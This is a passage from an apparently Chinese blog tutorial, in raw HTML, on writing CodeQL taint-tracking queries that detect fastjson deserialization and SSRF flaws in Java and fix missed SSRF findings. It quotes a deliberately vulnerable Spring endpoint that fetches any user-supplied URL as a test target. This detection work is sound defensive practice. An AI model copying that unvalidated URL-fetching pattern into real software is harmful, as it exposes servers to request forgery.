sink.asExpr() 是一个方法，用于将一个 sink 转换成一个表达式。这个方法通常用于在查询中使用 sink，因为查询需要将 sink 转换成表达式才能进行分析。</span></span><br><span class=\"line\">        )</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    override predicate <span class=\"title function_\">isSanitizer</span><span class=\"params\">(DataFlow::Node node)</span> &#123;</span><br><span class=\"line\">        node.getType() <span class=\"keyword\">instanceof</span> PrimitiveType or</span><br><span class=\"line\">        node.getType() <span class=\"keyword\">instanceof</span> BoxedType or</span><br><span class=\"line\">        node.getType() <span class=\"keyword\">instanceof</span> NumberType or</span><br><span class=\"line\">        <span class=\"title function_\">exists</span><span class=\"params\">(ParameterizedType pt| </span></span><br><span class=\"line\"><span class=\"params\">            node.getType()</span> = pt and pt.getTypeArgument(<span class=\"number\">0</span>) <span class=\"keyword\">instanceof</span> NumberType</span><br><span class=\"line\">         )</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    override predicate <span class=\"title function_\">isAdditionalTaintStep</span><span class=\"params\">(DataFlow::Node node1, DataFlow::Node node2)</span> &#123;</span><br><span class=\"line\">        isTaintedString(node1.asExpr(), node2.asExpr())</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class=\"line\">where config.hasFlowPath(source, sink)</span><br><span class=\"line\">select source.getNode(), source, sink, <span class=\"string\">&quot;source&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"fastjson\"><a href=\"#fastjson\" class=\"headerlink\" title=\"fastjson\"></a>fastjson</h1><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.security.QueryInjection</span><br><span class=\"line\"><span class=\"keyword\">import</span> DataFlow::PathGraph</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">FastjsonVulConfig</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">TaintTracking</span>::Configuration &#123;</span><br><span class=\"line\">    FastjsonVulConfig() &#123; <span class=\"built_in\">this</span> = <span class=\"string\">&quot;fastjson&quot;</span> &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    override predicate <span class=\"title function_\">isSource</span><span class=\"params\">(DataFlow::Node src)</span> &#123;</span><br><span class=\"line\">        src <span class=\"keyword\">instanceof</span> RemoteFlowSource</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    override predicate <span class=\"title function_\">isSink</span><span class=\"params\">(DataFlow::Node sink)</span> &#123;</span><br><span class=\"line\">        exists(Method method, MethodAccess call|</span><br><span class=\"line\">            method.hasName(<span class=\"string\">&quot;parseObject&quot;</span>)</span><br><span class=\"line\">            and</span><br><span class=\"line\">            call.getMethod() = method and</span><br><span class=\"line\">            sink.asExpr() = call.getArgument(<span class=\"number\">0</span>)</span><br><span class=\"line\">            )</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from FastjsonVulConfig fastjsonVul, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class=\"line\">where fastjsonVul.hasFlowPath(source, sink)</span><br><span class=\"line\">select source.getNode(), source, sink, <span class=\"string\">&quot;source&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h1><p> RequestForgerySink 类。</p>\n<blockquote>\n<p>A data flow sink for server-side request forgery (SSRF) vulnerabilities.</p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.security.QueryInjection</span><br><span class=\"line\"><span class=\"keyword\">import</span> DataFlow::PathGraph</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.security.RequestForgeryConfig</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SSRFVulConfig</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">TaintTracking</span>::Configuration &#123;</span><br><span class=\"line\">\t\tSSRFVulConfig() &#123; <span class=\"built_in\">this</span> = <span class=\"string\">&quot;SSRFVulConfig&quot;</span> &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    override predicate <span class=\"title function_\">isSource</span><span class=\"params\">(DataFlow::Node src)</span> &#123;</span><br><span class=\"line\">        src <span class=\"keyword\">instanceof</span> RemoteFlowSource</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    override predicate <span class=\"title function_\">isSink</span><span class=\"params\">(DataFlow::Node sink)</span> &#123;</span><br><span class=\"line\">    sink <span class=\"keyword\">instanceof</span> RequestForgerySink</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> from SSRFVulConfig ssrfVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class=\"line\"> where ssrfVulConfig.hasFlowPath(source, sink)</span><br><span class=\"line\"> select source.getNode(), source, sink, <span class=\"string\">&quot;source&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"ssrf-漏报处理1\"><a href=\"#ssrf-漏报处理1\" class=\"headerlink\" title=\"ssrf 漏报处理1\"></a>ssrf 漏报处理1</h1><h2 id=\"漏报原因排查\"><a href=\"#漏报原因排查\" class=\"headerlink\" title=\"漏报原因排查\"></a>漏报原因排查</h2><p>但是其实ssrf 提供了5个路由都可以可以进行ssrf的，但是只排查出了3个。首先看看 two 这个路由 </p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RequestMapping(value = &quot;/two&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">Two</span><span class=\"params\">(<span class=\"meta\">@RequestParam(value = &quot;url&quot;)</span> String imageUrl)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">URL</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">URL</span>(imageUrl);</span><br><span class=\"line\">        <span class=\"type\">HttpResponse</span> <span class=\"variable\">response</span> <span class=\"operator\">=</span> Request.Get(String.valueOf(url)).execute().returnResponse();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> response.toString();</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (IOException var1) &#123;</span><br><span class=\"line\">        System.out.println(var1);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Hello&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>imageUrl→url = new URL(imageUrl)→String.valueOf(url)→Request.Get(String.valueOf(url))</code></p>\n<p>在 <code>two</code> 接口中的代码有问题的地方如下，用到了 <code>String.valueOf(url)</code>,正常情况下程序不会觉得 <code>String.valueOf()</code> 方法返回的仍然是污点。因此我们需要修改 Config 中的 <code>isAdditionalTaintStep</code> 方法，将 <code>java.net.URL</code> 和 <code>String.valueOf(url)</code> 绑定。</p>\n<p>我们这里直接跟进RequestForgeryConfig 这个类看一看。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241130010138565.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241130010138565.png\"  alt=\"image-20241130010138565\" lazyload></a></p>\n<p>注意这个isAdditionalTaintStep。继续跟进propagatesTaint谓语。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241130010703439.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241130010703439.png\"  alt=\"image-20241130010703439\" lazyload></a></p>\n<h2 id=\"处理方法1\"><a href=\"#处理方法1\" class=\"headerlink\" title=\"处理方法1\"></a>处理方法1</h2><p>我们这里直接修改 RequestForgery.qll  源码。主要是14到24行，还有 第 47 行。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/** Provides classes to reason about server-side request forgery (SSRF) attacks. */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.frameworks.Networking</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.frameworks.ApacheHttp</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.frameworks.spring.Spring</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.frameworks.JaxWS</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.frameworks.javase.Http</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.DataFlow</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.frameworks.Properties</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">import</span> semmle.code.java.dataflow.StringPrefixes</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">import</span> semmle.code.java.dataflow.ExternalFlow</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">class</span> <span class=\"title class_\">TypeStringLib</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RefType</span> &#123;</span><br><span class=\"line\">    TypeStringLib() &#123; <span class=\"built_in\">this</span>.hasQualifiedName(<span class=\"string\">&quot;java.lang&quot;</span>, <span class=\"string\">&quot;String&quot;</span>) &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">class</span> <span class=\"title class_\">StringValue</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">MethodAccess</span> &#123;</span><br><span class=\"line\">    StringValue()&#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.getCallee().getDeclaringType() <span class=\"keyword\">instanceof</span> TypeStringLib and</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.getCallee().hasName(<span class=\"string\">&quot;valueOf&quot;</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * A unit class for adding additional taint steps that are specific to server-side request forgery (SSRF) attacks.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * Extend this class to add additional taint steps to the SSRF query.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">RequestForgeryAdditionalTaintStep</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Unit</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">   * Holds if the step from `pred` to `succ` should be considered a taint</span></span><br><span class=\"line\"><span class=\"comment\">   * step for server-side request forgery.</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  <span class=\"keyword\">abstract</span> predicate <span class=\"title function_\">propagatesTaint</span><span class=\"params\">(DataFlow::Node pred, DataFlow::Node succ)</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DefaultRequestForgeryAdditionalTaintStep</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RequestForgeryAdditionalTaintStep</span> &#123;</span><br><span class=\"line\">  override predicate <span class=\"title function_\">propagatesTaint</span><span class=\"params\">(DataFlow::Node pred, DataFlow::Node succ)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// propagate to a URI when its host is assigned to</span></span><br><span class=\"line\">    exists(UriCreation c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class=\"line\">    or</span><br><span class=\"line\">    <span class=\"comment\">// propagate to a URL when its host is assigned to</span></span><br><span class=\"line\">    exists(UrlConstructorCall c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class=\"line\">    or </span><br><span class=\"line\">      <span class=\"comment\">//处理String.valueOf(URL)</span></span><br><span class=\"line\">    exists(StringValue c | c.getArgument(<span class=\"number\">0</span>) = pred.asExpr() | succ.asExpr() = c)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TypePropertiesRequestForgeryAdditionalTaintStep</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RequestForgeryAdditionalTaintStep</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  override predicate <span class=\"title function_\">propagatesTaint</span><span class=\"params\">(DataFlow::Node pred, DataFlow::Node succ)</span> &#123;</span><br><span class=\"line\">    exists(MethodAccess ma |</span><br><span class=\"line\">      <span class=\"comment\">// Properties props = new Properties();</span></span><br><span class=\"line\">      <span class=\"comment\">// props.setProperty(&quot;jdbcUrl&quot;, tainted);</span></span><br><span class=\"line\">      <span class=\"comment\">// Propagate tainted value to the qualifier `props`</span></span><br><span class=\"line\">      ma.getMethod() <span class=\"keyword\">instanceof</span> PropertiesSetPropertyMethod and</span><br><span class=\"line\">      ma.getArgument(<span class=\"number\">0</span>).(CompileTimeConstantExpr).getStringValue() = <span class=\"string\">&quot;jdbcUrl&quot;</span> and</span><br><span class=\"line\">      pred.asExpr() = ma.getArgument(<span class=\"number\">1</span>) and</span><br><span class=\"line\">      succ.asExpr() = ma.getQualifier()</span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/** A data flow sink for server-side request forgery (SSRF) vulnerabilities. */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">RequestForgerySink</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">DataFlow</span>::Node &#123; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DefaultRequestForgerySink</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RequestForgerySink</span> &#123;</span><br><span class=\"line\">  DefaultRequestForgerySink() &#123; sinkNode(<span class=\"built_in\">this</span>, <span class=\"string\">&quot;request-forgery&quot;</span>) &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/** A sanitizer for request forgery vulnerabilities. */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">RequestForgerySanitizer</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">DataFlow</span>::Node &#123; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">class</span> <span class=\"title class_\">PrimitiveSanitizer</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RequestForgerySanitizer</span> &#123;</span><br><span class=\"line\">  PrimitiveSanitizer() &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.getType() <span class=\"keyword\">instanceof</span> PrimitiveType or</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.getType() <span class=\"keyword\">instanceof</span> BoxedType or</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.getType() <span class=\"keyword\">instanceof</span> NumberType</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">class</span> <span class=\"title class_\">HostnameSanitizingPrefix</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">InterestingPrefix</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> offset;</span><br><span class=\"line\"></span><br><span class=\"line\">  HostnameSanitizingPrefix() &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Matches strings that look like when prepended to untrusted input, they will restrict</span></span><br><span class=\"line\">    <span class=\"comment\">// the host or entity addressed: for example, anything containing `?` or `#`, or a slash that</span></span><br><span class=\"line\">    <span class=\"comment\">// doesn&#x27;t appear to be a protocol specifier (e.g. `http://` is not sanitizing), or specifically</span></span><br><span class=\"line\">    <span class=\"comment\">// the string &quot;/&quot;.</span></span><br><span class=\"line\">    exists(<span class=\"built_in\">this</span>.getStringValue().regexpFind(<span class=\"string\">&quot;([?#]|[^?#:/\\\\\\\\][/\\\\\\\\])|^/$&quot;</span>, <span class=\"number\">0</span>, offset))</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  override <span class=\"type\">int</span> <span class=\"title function_\">getOffset</span><span class=\"params\">()</span> &#123; result = offset &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * A value that is the result of prepending a string that prevents any value from controlling the</span></span><br><span class=\"line\"><span class=\"comment\"> * host of a URL.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">class</span> <span class=\"title class_\">HostnameSantizer</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RequestForgerySanitizer</span> &#123;</span><br><span class=\"line\">  HostnameSantizer() &#123; <span class=\"built_in\">this</span>.asExpr() = any(HostnameSanitizingPrefix hsp).getAnAppendedExpression() &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"处理方法2\"><a href=\"#处理方法2\" class=\"headerlink\" title=\"处理方法2\"></a>处理方法2</h2><p>或者不改写lib，直接改写 ql 查询语句。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.ExternalFlow</span><br><span class=\"line\"><span class=\"keyword\">import</span> DataFlow::PathGraph</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.security.RequestForgeryConfig</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TypeStringLib</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RefType</span> &#123;</span><br><span class=\"line\">  TypeStringLib() &#123; <span class=\"built_in\">this</span>.hasQualifiedName(<span class=\"string\">&quot;java.lang&quot;</span>, <span class=\"string\">&quot;String&quot;</span>) &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">StringValue</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">MethodAccess</span> &#123;</span><br><span class=\"line\">  StringValue()&#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.getCallee().getDeclaringType() <span class=\"keyword\">instanceof</span> TypeStringLib and</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.getCallee().hasName(<span class=\"string\">&quot;valueOf&quot;</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MyRequestForgeryAdditionalTaintStep</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RequestForgeryAdditionalTaintStep</span> &#123;</span><br><span class=\"line\">  override predicate <span class=\"title function_\">propagatesTaint</span><span class=\"params\">(DataFlow::Node pred, DataFlow::Node succ)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// propagate to a URI when its host is assigned to</span></span><br><span class=\"line\">    exists(UriCreation c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class=\"line\">    or</span><br><span class=\"line\">    <span class=\"comment\">// propagate to a URL when its host is assigned to</span></span><br><span class=\"line\">    exists(UrlConstructorCall c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class=\"line\">    or </span><br><span class=\"line\">    <span class=\"comment\">//处理String.valueOf(URL)</span></span><br><span class=\"line\">    exists(StringValue c | c.getArgument(<span class=\"number\">0</span>) = pred.asExpr() | succ.asExpr() = c)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SSRFVulConfig</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">TaintTracking</span>::Configuration &#123;</span><br><span class=\"line\">  SSRFVulConfig() &#123; <span class=\"built_in\">this</span> = <span class=\"string\">&quot;first_modifySSRF&quot;</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  override predicate <span class=\"title function_\">isSource</span><span class=\"params\">(DataFlow::Node source)</span> &#123;</span><br><span class=\"line\">      source <span class=\"keyword\">instanceof</span> RemoteFlowSource and</span><br><span class=\"line\">      <span class=\"comment\">// Exclude results of remote HTTP requests: fetching something else based on that result</span></span><br><span class=\"line\">      <span class=\"comment\">// is no worse than following a redirect returned by the remote server, and typically</span></span><br><span class=\"line\">      <span class=\"comment\">// we&#x27;re requesting a resource via https which we trust to only send us to safe URLs.</span></span><br><span class=\"line\">      not source.asExpr().(MethodAccess).getCallee() <span class=\"keyword\">instanceof</span> UrlConnectionGetInputStreamMethod</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   override predicate <span class=\"title function_\">isSink</span><span class=\"params\">(DataFlow::Node sink)</span> &#123;</span><br><span class=\"line\">      sink <span class=\"keyword\">instanceof</span> RequestForgerySink</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   override predicate <span class=\"title function_\">isAdditionalTaintStep</span><span class=\"params\">(DataFlow::Node pred, DataFlow::Node succ)</span> &#123;</span><br><span class=\"line\">      any(RequestForgeryAdditionalTaintStep r).propagatesTaint(pred, succ)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">from SSRFVulConfig ssrfVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class=\"line\">where ssrfVulConfig.hasFlowPath(source, sink)</span><br><span class=\"line\">select source.getNode(), source, sink, <span class=\"string\">&quot;source&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"ssrf-漏报处理2\"><a href=\"#ssrf-漏报处理2\" class=\"headerlink\" title=\"ssrf 漏报处理2\"></a>ssrf 漏报处理2</h1><p>还有一个漏的。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 